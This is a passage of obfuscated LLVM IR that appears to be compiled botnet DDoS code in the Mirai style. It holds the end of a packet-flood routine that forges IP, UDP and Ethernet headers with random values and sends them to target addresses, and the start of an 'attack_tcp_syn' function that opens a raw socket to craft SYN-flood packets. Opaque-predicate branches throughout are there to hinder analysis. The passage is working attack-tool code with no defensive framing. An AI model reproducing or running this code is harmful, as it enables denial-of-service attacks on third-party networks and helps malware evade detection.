  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %404, label %413, label %428

; <label>:413:                                    ; preds = %originalBBpart221
  %414 = call i32 @rand_next()
  %415 = and i32 %414, 65535
  %416 = trunc i32 %415 to i16
  %417 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 3
  store i16 %416, i16* %418, align 4
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 3
  %421 = load i16, i16* %420, align 4
  %422 = zext i16 %421 to i32
  %423 = sub nsw i32 %422, 1000
  %424 = xor i32 %423, -1
  %425 = trunc i32 %424 to i16
  %426 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 3
  store i16 %425, i16* %427, align 4
  br label %428

; <label>:428:                                    ; preds = %413, %originalBBpart221
  %429 = load i32, i32* @x.21
  %430 = load i32, i32* @y.22
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %428
  %437 = load i16, i16* %18, align 2
  %438 = zext i16 %437 to i32
  %439 = icmp eq i32 %438, 65535
  %440 = load i32, i32* @x.21
  %441 = load i32, i32* @y.22
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %439, label %448, label %454

; <label>:448:                                    ; preds = %originalBBpart225
  %449 = call i32 @rand_next()
  %450 = and i32 %449, 65535
  %451 = trunc i32 %450 to i16
  %452 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %453 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %452, i32 0, i32 0
  store i16 %451, i16* %453, align 2
  br label %454

; <label>:454:                                    ; preds = %448, %originalBBpart225
  %455 = load i16, i16* %19, align 2
  %456 = zext i16 %455 to i32
  %457 = icmp eq i32 %456, 65535
  br i1 %457, label %458, label %464

; <label>:458:                                    ; preds = %454
  %459 = call i32 @rand_next()
  %460 = and i32 %459, 65535
  %461 = trunc i32 %460 to i16
  %462 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %463 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %462, i32 0, i32 1
  store i16 %461, i16* %463, align 2
  br label %464

; <label>:464:                                    ; preds = %458, %454
  %465 = load i8, i8* %22, align 1
  %466 = icmp ne i8 %465, 0
  br i1 %466, label %487, label %467

; <label>:467:                                    ; preds = %464
  %468 = load i32, i32* @x.21
  %469 = load i32, i32* @y.22
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %467
  %476 = call i32 @rand_next()
  %477 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 9
  store i32 %476, i32* %478, align 4
  %479 = load i32, i32* @x.21
  %480 = load i32, i32* @y.22
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %493

; <label>:487:                                    ; preds = %464
  %488 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 9
  %490 = load i32, i32* %489, align 4
  %491 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 9
  store i32 %490, i32* %492, align 4
  br label %493

; <label>:493:                                    ; preds = %487, %originalBBpart229
  %494 = call i32 @rand_next()
  store i32 %494, i32* %40, align 4
  %495 = call i32 @rand_next()
  store i32 %495, i32* %41, align 4
  %496 = call i32 @rand_next()
  store i32 %496, i32* %42, align 4
  %497 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %498 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %497, i32 0, i32 0
  %499 = getelementptr inbounds [6 x i8], [6 x i8]* %498, i32 0, i32 0
  %500 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %499, i8* %500, i32 4)
  %501 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %502 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %501, i32 0, i32 1
  %503 = getelementptr inbounds [6 x i8], [6 x i8]* %502, i32 0, i32 0
  %504 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %503, i8* %504, i32 4)
  %505 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %506 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %505, i32 0, i32 0
  %507 = getelementptr inbounds [6 x i8], [6 x i8]* %506, i32 0, i32 0
  %508 = getelementptr inbounds i8, i8* %507, i64 4
  %509 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %508, i8* %509, i32 2)
  %510 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %511 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %510, i32 0, i32 1
  %512 = getelementptr inbounds [6 x i8], [6 x i8]* %511, i32 0, i32 0
  %513 = getelementptr inbounds i8, i8* %512, i64 4
  %514 = bitcast i32* %42 to i8*
  %515 = getelementptr inbounds i8, i8* %514, i64 2
  call void @util_memcpy(i8* %513, i8* %515, i32 2)
  %516 = load i8, i8* %21, align 1
  %517 = icmp ne i8 %516, 0
  br i1 %517, label %518, label %541

; <label>:518:                                    ; preds = %493
  %519 = load i32, i32* @x.21
  %520 = load i32, i32* @y.22
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %518
  %527 = load i8*, i8** %39, align 8
  %528 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %527, i32 %528)
  %529 = load i8*, i8** %39, align 8
  %530 = load i32, i32* %20, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds i8, i8* %529, i64 %531
  store i8 0, i8* %532, align 1
  %533 = load i32, i32* @x.21
  %534 = load i32, i32* @y.22
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %541

; <label>:541:                                    ; preds = %originalBBpart233, %493
  %542 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %543 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %542, i32 0, i32 7
  store i16 0, i16* %543, align 2
  %544 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %545 = bitcast %struct.iphdr* %544 to i16*
  %546 = call zeroext i16 @checksum_generic(i16* %545, i32 20)
  %547 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %548 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %547, i32 0, i32 7
  store i16 %546, i16* %548, align 2
  %549 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %550 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %549, i32 0, i32 7
  store i16 0, i16* %550, align 2
  %551 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %552 = bitcast %struct.iphdr* %551 to i16*
  %553 = call zeroext i16 @checksum_generic(i16* %552, i32 20)
  %554 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %555 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %554, i32 0, i32 7
  store i16 %553, i16* %555, align 2
  %556 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %557 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %556, i32 0, i32 3
  store i16 0, i16* %557, align 2
  %558 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %559 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %560 = bitcast %struct.udphdr* %559 to i8*
  %561 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %562 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %561, i32 0, i32 2
  %563 = load i16, i16* %562, align 2
  %564 = load i32, i32* %20, align 4
  %565 = sext i32 %564 to i64
  %566 = add i64 8, %565
  %567 = trunc i64 %566 to i32
  %568 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %558, i8* %560, i16 zeroext %563, i32 %567)
  %569 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %570 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %569, i32 0, i32 3
  store i16 %568, i16* %570, align 2
  %571 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %572 = load i32, i32* %11, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i64 %573
  %575 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %574, i32 0, i32 0
  %576 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %575, i32 0, i32 0
  store i16 2, i16* %576, align 4
  %577 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %578 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %577, i32 0, i32 9
  %579 = load i32, i32* %578, align 4
  %580 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %581 = load i32, i32* %11, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %580, i64 %582
  %584 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i32 0, i32 0
  %585 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %584, i32 0, i32 2
  %586 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %585, i32 0, i32 0
  store i32 %579, i32* %586, align 4
  %587 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %588 = load i32, i32* %11, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 0
  %592 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %591, i32 0, i32 1
  store i16 0, i16* %592, align 2
  %593 = load i32, i32* %12, align 4
  %594 = load i8*, i8** %33, align 8
  %595 = load i32, i32* %20, align 4
  %596 = sext i32 %595 to i64
  %597 = add i64 66, %596
  %598 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %599 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %600 = load i32, i32* %11, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i64 %601
  %603 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %602, i32 0, i32 0
  %604 = bitcast %struct.sockaddr_in* %603 to %struct.sockaddr*
  store %struct.sockaddr* %604, %struct.sockaddr** %598, align 8
  %605 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %606 = load %struct.sockaddr*, %struct.sockaddr** %605, align 8
  %607 = call i64 @sendto(i32 %593, i8* %594, i64 %597, i32 16384, %struct.sockaddr* %606, i32 16)
  br label %608

; <label>:608:                                    ; preds = %541
  %609 = load i32, i32* %11, align 4
  %610 = add nsw i32 %609, 1
  store i32 %610, i32* %11, align 4
  br label %313

; <label>:611:                                    ; preds = %313
  %612 = call i64 @time(i64* null) #6
  %613 = load i32, i32* %24, align 4
  %614 = sext i32 %613 to i64
  %615 = icmp sgt i64 %612, %614
  br i1 %615, label %616, label %633

; <label>:616:                                    ; preds = %611
  %617 = load i32, i32* @x.21
  %618 = load i32, i32* @y.22
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %616
  %625 = load i32, i32* @x.21
  %626 = load i32, i32* @y.22
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %650

; <label>:633:                                    ; preds = %611
  %634 = load i32, i32* @x.21
  %635 = load i32, i32* @y.22
  %636 = sub i32 %634, 1
  %637 = mul i32 %634, %636
  %638 = urem i32 %637, 2
  %639 = icmp eq i32 %638, 0
  %640 = icmp slt i32 %635, 10
  %641 = or i1 %639, %640
  br i1 %641, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %633
  %642 = load i32, i32* @x.21
  %643 = load i32, i32* @y.22
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %312

; <label>:650:                                    ; preds = %originalBBpart237, %100, %94
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %104
  %651 = load i32, i32* %11, align 4
  %652 = load i8, i8* %7, align 1
  %653 = zext i8 %652 to i32
  %654 = icmp slt i32 %651, %653
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %234
  %655 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %656 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %657 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %656, i32 0, i32 4
  store i16 %655, i16* %657, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %292
  %658 = load i32, i32* %11, align 4
  %_ = shl i32 %658, 1
  %_7 = sub i32 %658, 1
  %gen = mul i32 %_7, 1
  %_8 = sub i32 %658, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 0, %658
  %gen11 = add i32 %_10, 1
  %659 = add nsw i32 %658, 1
  store i32 %659, i32* %11, align 4
  br label %originalBB6

originalBB15alteredBB:                            ; preds = %originalBB15, %373
  %660 = call i32 @rand_next()
  %661 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %662 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %661, i32 0, i32 8
  store i32 %660, i32* %662, align 4
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %393
  %663 = load i16, i16* %15, align 2
  %664 = zext i16 %663 to i32
  %665 = icmp eq i32 %664, 65535
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %428
  %666 = load i16, i16* %18, align 2
  %667 = zext i16 %666 to i32
  %668 = icmp eq i32 %667, 65535
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %467
  %669 = call i32 @rand_next()
  %670 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %671 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %670, i32 0, i32 9
  store i32 %669, i32* %671, align 4
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %518
  %672 = load i8*, i8** %39, align 8
  %673 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %672, i32 %673)
  %674 = load i8*, i8** %39, align 8
  %675 = load i32, i32* %20, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds i8, i8* %674, i64 %676
  store i8 0, i8* %677, align 1
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %616
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %633
  br label %originalBB39
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 24, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add nsw i64 %99, %101
  %103 = trunc i64 %102 to i32
  store i32 %103, i32* %29, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %12, align 4
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %5
  br label %611

; <label>:107:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %108 = load i32, i32* %12, align 4
  %109 = bitcast i32* %11 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %115

; <label>:112:                                    ; preds = %107
  %113 = load i32, i32* %12, align 4
  %114 = call i32 @close(i32 %113)
  br label %611

; <label>:115:                                    ; preds = %107
  %116 = load i32, i32* @x.23
  %117 = load i32, i32* @y.24
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %115
  store i32 0, i32* %11, align 4
  %124 = load i32, i32* @x.23
  %125 = load i32, i32* @y.24
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %132

; <label>:132:                                    ; preds = %309, %originalBBpart2
  %133 = load i32, i32* %11, align 4
  %134 = load i8, i8* %7, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp slt i32 %133, %135
  br i1 %136, label %137, label %312

; <label>:137:                                    ; preds = %132
  %138 = call noalias i8* @calloc(i64 128, i64 1) #6
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  store i8* %138, i8** %142, align 8
  %143 = load i8**, i8*** %13, align 8
  %144 = load i32, i32* %11, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to %struct.iphdr*
  store %struct.iphdr* %148, %struct.iphdr** %30, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i64 1
  %151 = bitcast %struct.iphdr* %150 to %struct.tcphdr*
  store %struct.tcphdr* %151, %struct.tcphdr** %31, align 8
  %152 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %153 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %152, i64 1
  %154 = bitcast %struct.tcphdr* %153 to i8*
  store i8* %154, i8** %32, align 8
  %155 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %156 = bitcast %struct.iphdr* %155 to i8*
  %157 = load i8, i8* %156, align 4
  %158 = and i8 %157, 15
  %159 = or i8 %158, 64
  store i8 %159, i8* %156, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = load i8, i8* %161, align 4
  %163 = and i8 %162, -16
  %164 = or i8 %163, 5
  store i8 %164, i8* %161, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 1
  store i8 %165, i8* %167, align 1
  %168 = call zeroext i16 @htons(i16 zeroext 60) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i16, i16* %15, align 2
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i8, i8* %16, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 5
  store i8 %175, i8* %177, align 4
  %178 = load i8, i8* %17, align 1
  %179 = icmp ne i8 %178, 0
  br i1 %179, label %180, label %184

; <label>:180:                                    ; preds = %137
  %181 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 4
  store i16 %181, i16* %183, align 2
  br label %184

; <label>:184:                                    ; preds = %180, %137
  %185 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 6
  store i8 6, i8* %186, align 1
  %187 = load i32, i32* %28, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 8
  store i32 %187, i32* %189, align 4
  %190 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %191 = load i32, i32* %11, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 9
  store i32 %195, i32* %197, align 4
  %198 = load i16, i16* %18, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  store i16 %199, i16* %201, align 4
  %202 = load i16, i16* %19, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 1
  store i16 %203, i16* %205, align 2
  %206 = load i32, i32* %20, align 4
  %207 = trunc i32 %206 to i16
  %208 = call zeroext i16 @htons(i16 zeroext %207) #7
  %209 = zext i16 %208 to i32
  %210 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
